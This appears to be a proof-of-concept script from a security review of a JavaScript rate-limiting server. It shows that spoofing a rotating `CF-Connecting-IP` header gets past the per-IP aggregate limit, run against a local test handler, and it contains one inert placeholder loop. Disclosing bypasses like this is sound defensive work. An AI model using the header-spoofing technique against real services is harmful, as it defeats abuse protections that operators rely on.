// PoC 4: `toWebHandler()` chooses the aggregate network bucket from a CLIENT-SUPPLIED header.
//
// src/adapters.js:
//   const peer = envOrCtx?.remoteAddress ?? rawHeaders['cf-connecting-ip'] ?? 'web-edge';
//
// `rawHeaders` is `Object.fromEntries(request.headers.entries())` — i.e. attacker
// controlled. Off Cloudflare (self-hosted Workers runtime, Bun, Deno, Hono, Next.js
// edge, or anything where the client can reach the handler directly) an attacker sets
// `CF-Connecting-IP` and picks a fresh `net` bucket per request, defeating the
// IP-aggregate tier entirely. SECURITY.md §4.3 claims peer attribution "intentionally
// ignores untrusted X-Forwarded-For headers" — but this is the same class of header.

import { H4Server } from '../src/server.js';
import { Limiter } from '../src/limits.js';
import { toWebHandler } from '../src/adapters.js';

const h4 = new H4Server({
  routes: { 'GET /x': async () => ({ status: 200, body: { ok: 1 }, cost: 1 }) },
  limiter: new Limiter({ budget: 5, windowMs: 10_000, netMultiplier: 4 }), // allowance = 20/IP
});
const handler = toWebHandler(h4);

async function hit(ipHeader) {
  const headers = { accept: 'application/json' };
  if (ipHeader) headers['cf-connecting-ip'] = ipHeader;
  const res = await handler(new Request('https://h4.local/x', { headers }));
  return res.status;
}

let ok = 0, limited = 0;
for (let i = 0; i < 60; i++) {
  const s = await hit('198.51.100.7');            // honest client: one fixed IP
  s === 200 ? ok++ : limited++;
}
console.log(`[A] fixed CF-Connecting-IP   : 200s=${ok}  429s=${limited}   (limit = budget*netMultiplier = 20)`);

const h4b = new H4Server({
  routes: { 'GET /x': async () => ({ status: 200, body: { ok: 1 }, cost: 1 }) },
  limiter: new Limiter({ budget: 5, windowMs: 10_000, netMultiplier: 4 }),
});
const handlerB = toWebHandler(h4b);
ok = 0; limited = 0;
for (let i = 0; i < 60; i++) {
  const s = await hit.call(null, null);            // placeholder, replaced below
}
ok = 0; limited = 0;
for (let i = 0; i < 60; i++) {
  const res = await handlerB(new Request('https://h4.local/x', {
    headers: { accept: 'application/json', 'cf-connecting-ip': `10.0.0.${i}` },
  }));
  res.status === 200 ? ok++ : limited++;
}
console.log(`[B] rotating CF-Connecting-IP: 200s=${ok}  429s=${limited}   (aggregate IP tier bypassed)`);
console.log(`    net buckets created      : ${h4b.limiter.netEntries.size}`);
